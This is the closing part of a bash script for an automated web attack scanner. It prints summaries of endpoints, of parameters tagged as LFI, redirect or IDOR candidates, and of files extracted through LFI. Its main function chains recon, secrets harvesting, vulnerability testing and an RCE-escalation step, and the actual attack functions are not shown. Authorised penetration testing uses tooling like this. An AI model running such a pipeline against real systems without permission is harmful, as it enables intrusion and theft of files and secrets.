    head -30 "${OUTDIR}/all_endpoints_paths.txt" 2>/dev/null | while IFS= read -r ep; do
      if [[ "$ep" == http* ]]; then
        printf '  \033[2m│ \033]8;;%s\033\\%s\033]8;;\033\\\033[0m\n' "$ep" "$ep" >&2
      else
        printf '  \033[2m│ %s\033[0m\n' "$ep" >&2
      fi
    done
    [[ "$total_endpoints" -gt 30 ]] && printf '  \033[2m│ ... and %d more (see all_endpoints.txt)\033[0m\n' "$((total_endpoints - 30))" >&2
    printf '  \033[1;36m└──────────────────────────────────────────────────────────────\033[0m\n' >&2
  fi

  # ── Discovered parameters ──
  if [[ "$total_params" -gt 0 ]]; then
    printf '\n' >&2
    printf '  \033[1;36m┌─── Discovered Parameters (%s) ─────────────────────────────\033[0m\n' "$total_params" >&2
    printf '  \033[1;36m│ %-45s %-15s %-8s %s\033[0m\n' "ENDPOINT" "PARAM" "METHOD" "SOURCE" >&2
    printf '  \033[1;36m│ %s\033[0m\n' "───────────────────────────────────────────── ─────────────── ──────── ──────────" >&2
    head -30 "${OUTDIR}/active_params.txt" 2>/dev/null | while IFS='|' read -r p_url p_param p_source p_method _; do
      [[ -z "$p_param" ]] && continue
      local short_url="${p_url#http*://}"
      [[ ${#short_url} -gt 43 ]] && short_url="${short_url:0:40}..."
      local tag=""
      echo "$p_param" | grep -qiE 'file|path|page|include|template|doc|load|read|dir|resource' && tag=" \033[1;31m[LFI?]\033[0m"
      echo "$p_param" | grep -qiE 'redirect|redir|next|return|goto|callback|dest|url' && tag=" \033[1;33m[REDIR?]\033[0m"
      echo "$p_param" | grep -qiE '^id$|user|email|name|password|token|key|secret|admin' && tag=" \033[1;36m[IDOR?]\033[0m"
      printf "  │ %-45s \033[1;32m%-15s\033[0m %-8s %s${tag}\n" "$short_url" "$p_param" "${p_method:-GET}" "${p_source:-?}" >&2
    done
    [[ "$total_params" -gt 30 ]] && printf '  \033[2m│ ... and %d more (see active_params.txt)\033[0m\n' "$((total_params - 30))" >&2
    printf '  \033[1;36m└──────────────────────────────────────────────────────────────\033[0m\n' >&2
  fi

  # ── LFI Reads (if any) ──
  if [[ -d "${OUTDIR}/lfi_reads" ]] && [[ "$(ls -A "${OUTDIR}/lfi_reads" 2>/dev/null)" ]]; then
    local lfi_file_count; lfi_file_count=$(ls -1 "${OUTDIR}/lfi_reads" 2>/dev/null | wc -l)
    printf '\n' >&2
    printf '  \033[1;33m┌─── LFI Extracted Files (%s) ──────────────────────────────\033[0m\n' "$lfi_file_count" >&2
    ls -1 "${OUTDIR}/lfi_reads" 2>/dev/null | while IFS= read -r lf; do
      local lf_size; lf_size=$(wc -c < "${OUTDIR}/lfi_reads/${lf}" 2>/dev/null || echo 0)
      local lf_name="${lf%.txt}"
      lf_name="${lf_name//_//}"
      printf '  \033[1;33m│\033[0m  /%s \033[2m(%s bytes)\033[0m\n' "$lf_name" "$lf_size" >&2
    done
    printf '  \033[1;33m└──────────────────────────────────────────────────────────────\033[0m\n' >&2
  fi

  # ── Quick Links (clickable in terminal) ──
  # Resolve to absolute path for file:// URLs
  local _abs_outdir
  _abs_outdir=$(cd "$OUTDIR" 2>/dev/null && pwd) || _abs_outdir="$OUTDIR"

  printf '\n\033[2m  ──────────────────────────────────────────────────────────────\033[0m\n' >&2
  printf '  \033[1;37m⚡ Quick Links (click to open):\033[0m\n' >&2
  printf '\n' >&2
  # Target URL
  printf '  \033[1;37mTarget:\033[0m     \033]8;;%s\033\\%s\033]8;;\033\\\n' "$TARGET" "$TARGET" >&2
  # HTML Report (best for browser)
  if [[ -f "${_abs_outdir}/REPORT.html" ]]; then
    printf '  \033[1;32mHTML Report:\033[0m \033]8;;file://%s/REPORT.html\033\\\033[4mfile://%s/REPORT.html\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  fi
  # Markdown Report
  printf '  \033[1;36mMD Report:\033[0m  \033]8;;file://%s/REPORT.md\033\\\033[4m%s/REPORT.md\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  # Findings JSON
  printf '  \033[1;33mFindings:\033[0m   \033]8;;file://%s/findings.json\033\\\033[4m%s/findings.json\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  # PoC commands
  printf '  \033[1;31mPoC cmds:\033[0m   \033]8;;file://%s/poc_commands.txt\033\\\033[4m%s/poc_commands.txt\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  # Parameters
  printf '  \033[1;36mParams:\033[0m     \033]8;;file://%s/active_params.txt\033\\\033[4m%s/active_params.txt\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  # Endpoints
  printf '  \033[1;36mEndpoints:\033[0m  \033]8;;file://%s/all_endpoints.txt\033\\\033[4m%s/all_endpoints.txt\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  # Request log (OSCP)
  if [[ -f "${_abs_outdir}/requests.log" ]] && [[ -s "${_abs_outdir}/requests.log" ]]; then
    printf '  \033[2mReq log:\033[0m    \033]8;;file://%s/requests.log\033\\\033[4m%s/requests.log\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  fi
  # Scan output dir
  printf '\n  \033[2mAll output:\033[0m \033]8;;file://%s\033\\\033[4m%s/\033[0m\033]8;;\033\\\n' "$_abs_outdir" "$_abs_outdir" >&2
  printf '\033[2m  ──────────────────────────────────────────────────────────────\033[0m\n' >&2

  _json_event "scan_complete" "{\"duration\":$duration,\"findings\":$total_findings,\"secrets\":$total_secrets}"
}

# ═══════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════
main() {
  _banner
  _load_config
  _parse_flags "$@"

  # Load plugins
  declare -f load_plugins &>/dev/null && load_plugins || true

  step0_init

  # Pre-scan plugin hook
  declare -f run_hook &>/dev/null && run_hook "pre_scan" "{\"target\":\"${TARGET}\",\"outdir\":\"${OUTDIR}\",\"framework\":\"${FRAMEWORK}\"}" || true

  # ── Single-module modes ──
  if [[ "$PARAM_ONLY" == true ]]; then
    step1_recon; step2_crawl; step3_probe; step4_params
    step6_report; exit 0
  fi
  if [[ "$SECRETS_ONLY" == true ]]; then
    step1_recon; step2_crawl; step3_probe; step4_5_secrets
    step6_report; exit 0
  fi
  if [[ "$LFI_ONLY" == true ]]; then
    step1_recon; step2_crawl; step3_probe; step4_params
    SKIP_NUCLEI=true; step5_vuln_test; step6_report; exit 0
  fi

  # ── Full pipeline ──
  step1_recon
  step2_crawl
  step3_probe

  # Post-discovery plugin hook
  declare -f run_hook &>/dev/null && run_hook "post_discovery" \
    "{\"target\":\"${TARGET}\",\"outdir\":\"${OUTDIR}\",\"endpoints_count\":$(wc -l < "${OUTDIR}/all_endpoints.txt" 2>/dev/null || echo 0)}" || true

  # Steps 4 and 4.5 run in parallel (independent)
  step4_params &
  local p4_pid=$!
  step4_5_secrets &
  local p45_pid=$!
  wait "$p4_pid" "$p45_pid" 2>/dev/null || true

  # Post-params plugin hook
  declare -f run_hook &>/dev/null && run_hook "post_params" \
    "{\"target\":\"${TARGET}\",\"outdir\":\"${OUTDIR}\",\"params_count\":$(wc -l < "${OUTDIR}/active_params.txt" 2>/dev/null || echo 0)}" || true

  step5_vuln_test
  step5_5_rce_escalation
  step6_report
}

main "$@"
